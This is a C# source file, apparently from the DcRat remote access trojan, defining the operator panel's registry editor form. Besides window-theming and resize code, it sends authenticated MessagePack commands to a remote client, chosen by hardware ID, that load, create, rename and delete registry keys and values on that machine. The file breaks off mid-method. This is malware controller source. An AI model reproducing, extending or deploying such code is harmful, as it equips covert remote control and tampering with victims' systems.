using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DcRat.Controls;
using DcRat.Helper;
using DcRat.helpForms;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;
using Microsoft.Win32;
using static DcRat.Helper.RegistrySeeker;

namespace DcRat.singleForms
{
    public partial class singleFormRegistry : Form
    {
        public string HWID { get; set; }

        public singleFormRegistry()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            InitBorder();
            SetTheme();
        }
        #region Theme
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            buttonmax.BackColor = colorSide;
            buttonmin.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonmax.Image = darkTheme ? Resources.max : Resources.max_dark;
            buttonmin.Image = darkTheme ? Resources.min : Resources.min_dark;

            tvRegistryDirectory.ForeColor = colorText;
            lstRegistryValues.ForeColor = colorText;
            statusStrip.ForeColor = colorText;
            tvRegistryDirectory.BackColor = colorSide;
            lstRegistryValues.BackColor = colorSide;
            statusStrip.BackColor = colorSide;
        }
        #endregion

        #region Border
        public enum MouseDirection
        {
            East,
            West,
            South,
            North,
            Southeast,
            Southwest,
            Northeast,
            Northwest,
            None
        }
        MouseDirection direction;
        Point rectangle;
        void InitBorder()
        {

            MouseDown += BorderMouseDown;

            MouseMove += BorderMouseMove;

            MouseLeave += BorderMouseLeave;
        }

        private void BorderMouseMove(object sender, MouseEventArgs e)
        {
            Point tempEndPoint = e.Location;
            int maxwidth = 800;
            int maxheight = 500;

            if (e.Button == MouseButtons.Left)
            {
                if (direction == MouseDirection.None)
                {
                }
                else if (direction == MouseDirection.East)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }

                }
                else if (direction == MouseDirection.South)
                {
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }
                }
                else if (direction == MouseDirection.West)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }


                }
                else if (direction == MouseDirection.North)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }

                }
                else if (direction == MouseDirection.Southeast)
                {
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northeast)
                {
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                    if (tempEndPoint.X <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = tempEndPoint.X;
                    }
                }
                else if (direction == MouseDirection.Southwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    if (tempEndPoint.Y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = tempEndPoint.Y;
                    }

                }
                else if (direction == MouseDirection.Northwest)
                {
                    int x = tempEndPoint.X - rectangle.X;
                    if (Width - x <= maxwidth)
                    {
                        Width = maxwidth;
                    }
                    else
                    {
                        Width = Width - x;
                        Location = new Point(Location.X + x, Location.Y);
                    }
                    int y = tempEndPoint.Y - rectangle.Y;
                    if (Height - y <= maxheight)
                    {
                        Height = maxheight;
                    }
                    else
                    {
                        Height = Height - y;
                        Location = new Point(Location.X, Location.Y + y);
                    }
                }
            }
            else
            {
                if (e.Location.X < 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Northwest;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Northeast;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNWSE;
                    direction = MouseDirection.Southeast;
                }
                else if (e.Location.X < 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNESW;
                    direction = MouseDirection.Southwest;
                }
                else if (e.Location.X < 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.West;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y < 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.North;
                }
                else if (e.Location.X > Width - 3 && e.Location.Y < Height - 3 && e.Location.Y > 3)
                {
                    Cursor = Cursors.SizeWE;
                    direction = MouseDirection.East;
                }
                else if (e.Location.X > 3 && e.Location.X < Width - 3 && e.Location.Y > Height - 3)
                {
                    Cursor = Cursors.SizeNS;
                    direction = MouseDirection.South;
                }
                else
                {
                    Cursor = Cursors.Default;
                    direction = MouseDirection.None;
                }
            }
        }

        private void BorderMouseDown(object sender, MouseEventArgs e)
        {
            rectangle = e.Location;
        }

        private void BorderMouseLeave(object sender, EventArgs e)
        {
            Cursor = Cursors.Default;
            direction = MouseDirection.None;
        }

        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion
        private void buttonmin_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void buttonmax_Click(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Maximized)
            {
                WindowState = FormWindowState.Normal;
            }
            else
            {
                MaximumSize = new Size(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);
                WindowState = FormWindowState.Maximized;
            }
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            if (HWID != null)
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "shellClose";
                pack.ForcePathObject("TargetClient").AsString = HWID;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }

            Close();
        }

        private void AddRootKey(RegSeekerMatch match)
        {
            TreeNode node = CreateNode(match.Key, match.Key, match.Data);
            node.Nodes.Add(new TreeNode());
            tvRegistryDirectory.Nodes.Add(node);
        }

        private TreeNode AddKeyToTree(TreeNode parent, RegSeekerMatch subKey)
        {
            TreeNode node = CreateNode(subKey.Key, subKey.Key, subKey.Data);
            parent.Nodes.Add(node);
            if (subKey.HasSubKeys)
            {
                node.Nodes.Add(new TreeNode());
            }

            return node;
        }

        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        public void AddKeys(string rootKey, RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootKey))
            {
                tvRegistryDirectory.BeginUpdate();

                foreach (var match in matches)
                {
                    AddRootKey(match);
                }

                tvRegistryDirectory.SelectedNode = tvRegistryDirectory.Nodes[0];

                tvRegistryDirectory.EndUpdate();
            }
            else
            {
                TreeNode parent = GetTreeNode(rootKey);

                if (parent != null)
                {
                    tvRegistryDirectory.BeginUpdate();

                    foreach (var match in matches)
                    {
                        AddKeyToTree(parent, match);
                    }

                    parent.Expand();
                    tvRegistryDirectory.EndUpdate();
                }
            }
        }

        public void CreateNewKey(string rootKey, RegSeekerMatch match)
        {
            TreeNode parent = GetTreeNode(rootKey);

            TreeNode node = AddKeyToTree(parent, match);

            node.EnsureVisible();

            tvRegistryDirectory.SelectedNode = node;
            node.Expand();
            tvRegistryDirectory.LabelEdit = true;
            node.BeginEdit();
        }

        public void DeleteKey(string rootKey, string subKey)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(subKey))
            {
                parent.Nodes.RemoveByKey(subKey);
            }
        }

        public void RenameKey(string rootKey, string oldName, string newName)
        {
            TreeNode parent = GetTreeNode(rootKey);

            if (parent.Nodes.ContainsKey(oldName))
            {
                parent.Nodes[oldName].Text = newName;
                parent.Nodes[oldName].Name = newName;

                tvRegistryDirectory.SelectedNode = parent.Nodes[newName];
            }
        }

        private TreeNode GetTreeNode(string path)
        {
            string[] nodePath = path.Split('\\');

            TreeNode lastNode = tvRegistryDirectory.Nodes[nodePath[0]];
            if (lastNode == null)
            {
                return null;
            }

            for (int i = 1; i < nodePath.Length; i++)
            {
                lastNode = lastNode.Nodes[nodePath[i]];
                if (lastNode == null)
                {
                    return null;
                }
            }
            return lastNode;
        }









        #region ListView helper functions

        public void CreateValue(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                List<RegValueData> valuesFromNode = ((RegValueData[])key.Tag).ToList();
                valuesFromNode.Add(value);
                key.Tag = valuesFromNode.ToArray();

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    RegistryValueLstItem item = new RegistryValueLstItem(value);
                    lstRegistryValues.Items.Add(item);
                    //Unselect all
                    lstRegistryValues.SelectedIndices.Clear();
                    item.Selected = true;
                    lstRegistryValues.LabelEdit = true;
                    item.BeginEdit();
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void DeleteValue(string keyPath, string valueName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                if (!RegValueHelper.IsDefaultValue(valueName))
                {
                    //Remove the values that have the specified name
                    key.Tag = ((RegValueData[])key.Tag).Where(value => value.Name != valueName).ToArray();

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        lstRegistryValues.Items.RemoveByKey(valueName);
                    }
                }
                else //Handle delete of default value
                {
                    var regValue = ((RegValueData[])key.Tag).First(item => item.Name == valueName);

                    if (tvRegistryDirectory.SelectedNode == key)
                    {
                        var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == valueName);
                        if (valueItem != null)
                        {
                            valueItem.Data = regValue.Kind.RegistryTypeToString(null);
                        }
                    }
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void RenameValue(string keyPath, string oldName, string newName)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                var value = ((RegValueData[])key.Tag).First(item => item.Name == oldName);
                value.Name = newName;

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == oldName);
                    if (valueItem != null)
                    {
                        valueItem.RegName = newName;
                    }
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        public void ChangeValue(string keyPath, RegValueData value)
        {
            TreeNode key = GetTreeNode(keyPath);

            if (key != null)
            {
                var regValue = ((RegValueData[])key.Tag).First(item => item.Name == value.Name);
                ChangeRegistryValue(value, regValue);

                if (tvRegistryDirectory.SelectedNode == key)
                {
                    var valueItem = lstRegistryValues.Items.Cast<RegistryValueLstItem>()
                                                     .SingleOrDefault(item => item.Name == value.Name);
                    if (valueItem != null)
                    {
                        valueItem.Data = RegValueHelper.RegistryValueToString(value);
                    }
                }

                tvRegistryDirectory.SelectedNode = key;
            }
        }

        private void ChangeRegistryValue(RegValueData source, RegValueData dest)
        {
            if (source.Kind != dest.Kind)
            {
                return;
            }

            dest.Data = source.Data;
        }

        private void UpdateLstRegistryValues(TreeNode node)
        {
            selectedStripStatusLabel.Text = node.FullPath;

            RegValueData[] ValuesFromNode = (RegValueData[])node.Tag;

            PopulateLstRegistryValues(ValuesFromNode);
        }

        private void PopulateLstRegistryValues(RegValueData[] values)
        {
            lstRegistryValues.BeginUpdate();
            lstRegistryValues.Items.Clear();

            //Sort values
            values = (
                from value in values
                orderby value.Name
                select value
                ).ToArray();

            foreach (var value in values)
            {
                RegistryValueLstItem item = new RegistryValueLstItem(value);
                lstRegistryValues.Items.Add(item);
            }

            lstRegistryValues.EndUpdate();
        }

        #endregion

        #region tvRegistryDirectory actions

        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label != null)
            {
                e.CancelEdit = true;

                if (e.Label.Length > 0)
                {
                    if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        e.Node.BeginEdit();
                    }
                    else
                    {
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "RenameRegistryKey";
                        pack.ForcePathObject("TargetClient").AsString = HWID;
                        pack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
                        pack.ForcePathObject("NewKeyName").AsString = e.Label;
                        pack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                        tvRegistryDirectory.LabelEdit = false;
                    }
                }
                else
                {
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    e.Node.BeginEdit();
                }
            }
            else
            {
                //Stop editing if no changes where made
                tvRegistryDirectory.LabelEdit = false;
            }
        }

        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode parentNode = e.Node;

            // If nothing is there (yet).
            if (string.IsNullOrEmpty(parentNode.FirstNode.Name))
            {
                tvRegistryDirectory.SuspendLayout();
                parentNode.Nodes.Clear();

                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "LoadRegistryKey";
                pack.ForcePathObject("RootKeyName").AsString = parentNode.FullPath;
                pack.ForcePathObject("TargetClient").AsString = HWID;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());

                Thread.Sleep(500);
                tvRegistryDirectory.ResumeLayout();

                e.Cancel = true;
            }
        }

        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                //Bug fix with rightclick not working for selectednode
                tvRegistryDirectory.SelectedNode = e.Node;

                //Display the context menu
                Point pos = new Point(e.X, e.Y);
                CreateTreeViewMenuStrip();
                tv_ContextMenuStrip.Show(tvRegistryDirectory, pos);
            }
        }

        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            UpdateLstRegistryValues(e.Node);
        }

        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && GetDeleteState())
            {
                deleteRegistryKey_Click(this, e);
            }
        }

        #endregion

        #region ToolStrip and contextmenu helper functions


        private void CreateTreeViewMenuStrip()
        {
            renameToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;

            deleteToolStripMenuItem.Enabled = tvRegistryDirectory.SelectedNode.Parent != null;
        }

        private void CreateListViewMenuStrip()
        {
            modifyToolStripMenuItem.Enabled =
                modifyBinaryDataToolStripMenuItem.Enabled = lstRegistryValues.SelectedItems.Count == 1;

            renameToolStripMenuItem1.Enabled = lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);

            deleteToolStripMenuItem1.Enabled = tvRegistryDirectory.SelectedNode != null && lstRegistryValues.SelectedItems.Count > 0;
        }

        #endregion

        #region lstRegistryKeys actions

        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point pos = new Point(e.X, e.Y);

                //Try to check if a item was clicked
                if (lstRegistryValues.GetItemAt(pos.X, pos.Y) == null)
                {
                    //Not on a item
                    lst_ContextMenuStrip.Show(lstRegistryValues, pos);
                }
                else
                {
                    //Clicked on a item
                    CreateListViewMenuStrip();
                    selectedItem_ContextMenuStrip.Show(lstRegistryValues, pos);
                }
            }
        }

        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label != null && tvRegistryDirectory.SelectedNode != null)
            {
                e.CancelEdit = true;
                int index = e.Item;

                if (e.Label.Length > 0)
                {
                    if (lstRegistryValues.Items.ContainsKey(e.Label))
                    {
                        MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        lstRegistryValues.Items[index].BeginEdit();
                        return;
                    }
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "RenameRegistryValue";
                    pack.ForcePathObject("TargetClient").AsString = HWID;
                    pack.ForcePathObject("OldValueName").AsString = lstRegistryValues.Items[index].Name;
                    pack.ForcePathObject("NewValueName").AsString = e.Label;
                    pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    lstRegistryValues.LabelEdit = false;
                }
                else
                {
                    MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    lstRegistryValues.Items[index].BeginEdit();

                }
            }
            else
            {
                lstRegistryValues.LabelEdit = false;
            }
        }

        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && GetDeleteState())
            {
                deleteRegistryValue_Click(this, e);
            }
        }

        #endregion

        #region ContextMenu

        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (!(tvRegistryDirectory.SelectedNode.IsExpanded) && tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
            {
                //Subscribe (wait for node to expand)
                tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
                tvRegistryDirectory.SelectedNode.Expand();
            }
            else
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryKey";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("ParentPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            // prompt user to confirm delete
            string msg = "Are you sure you want to permanently delete this key and all of its subkeys?";
            string caption = "Confirm Key Delete";
            var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (answer == DialogResult.Yes)
            {
                string parentPath = tvRegistryDirectory.SelectedNode.Parent.FullPath;

                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "DeleteRegistryKey";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyName").AsString = tvRegistryDirectory.SelectedNode.Name;
                pack.ForcePathObject("ParentPath").AsString = parentPath;

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());

            }
        }

        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            tvRegistryDirectory.LabelEdit = true;
            tvRegistryDirectory.SelectedNode.BeginEdit();
        }

        #region New registry value actions

        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_SZ
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "1";//RegistryValueKind.String

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_BINARY
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "3";//RegistryValueKind.Binary

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_DWORD
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "4";//RegistryValueKind.DWord

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_QWORD
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "11";//RegistryValueKind.QWord

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_MULTI_SZ
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "7";//RegistryValueKind.MultiString

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (tvRegistryDirectory.SelectedNode != null)
            {
                // request the creation of a new Registry value of type REG_EXPAND_SZ
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "CreateRegistryValue";
                pack.ForcePathObject("TargetClient").AsString = HWID;
                pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                pack.ForcePathObject("Kindstring").AsString = "2";//RegistryValueKind.ExpandString

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        #endregion

        #region Registry value edit actions

        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            //Prompt user to confirm delete
            string msg = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + (lstRegistryValues.SelectedItems.Count == 1 ? "this value?" : "these values?");
            string caption = "Confirm Value Delete";
            var answer = MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (answer == DialogResult.Yes)
            {
                foreach (var item in lstRegistryValues.SelectedItems)
                {
                    if (item.GetType() == typeof(RegistryValueLstItem))
                    {
                        RegistryValueLstItem registryValue = (RegistryValueLstItem)item;
                        MsgPack pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "DeleteRegistryValue";
                        pack.ForcePathObject("TargetClient").AsString = HWID;
                        pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                        pack.ForcePathObject("ValueName").AsString = registryValue.RegName;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    }
                }
            }
        }

        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
            lstRegistryValues.LabelEdit = true;
            lstRegistryValues.SelectedItems[0].BeginEdit();
        }

        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            CreateEditForm(false);
        }

        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            CreateEditForm(true);
        }

        #endregion

        #endregion

        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == tvRegistryDirectory.SelectedNode)
            {
                createNewRegistryKey_Click(this, e);

                tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
            }
        }

        #region helper functions

        private bool GetDeleteState()
        {
            if (lstRegistryValues.Focused)
            {
                return lstRegistryValues.SelectedItems.Count > 0;
            }

            if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
            {
